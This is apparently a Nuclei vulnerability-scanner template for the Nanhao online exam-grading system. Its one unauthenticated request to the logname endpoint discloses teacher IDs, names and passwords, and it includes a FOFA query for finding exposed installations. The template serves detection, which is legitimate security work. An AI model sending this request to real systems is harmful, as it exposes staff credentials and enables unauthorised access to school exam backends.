http:
    - matchers:
        - condition: and
          part: body
          type: word
          words:
            - 请进行账户信息确认
            - 教师ID
            - 教师姓名
            - 教师密码
        - status:
            - 200
          type: status
      matchers-condition: and
      raw:
        - |
          GET /exam/monitor/index.jsp?logname=admin HTTP/1.1
          Host: {{Hostname}}
id: nanhao-logname-Information-disclosure
info:
    author: Superhero
    description: |-
        fofa: app="南昊网上阅卷系统"
        南昊网上阅卷系统 logname接口存在信息泄露漏洞，未经身份验证的远程攻击者可利用此漏洞获取网站后台系统用户密码等敏感信息，从而登录网站后台系统，使网站处于极不安全的状态。
    name: 南昊网上阅卷系统 logname 信息泄露漏洞
    reference:
        - https://mp.weixin.qq.com/s/XN2Yv_D0SjOhW1ksHDsejw
    severity: medium
    tags:
        - Information disclosure
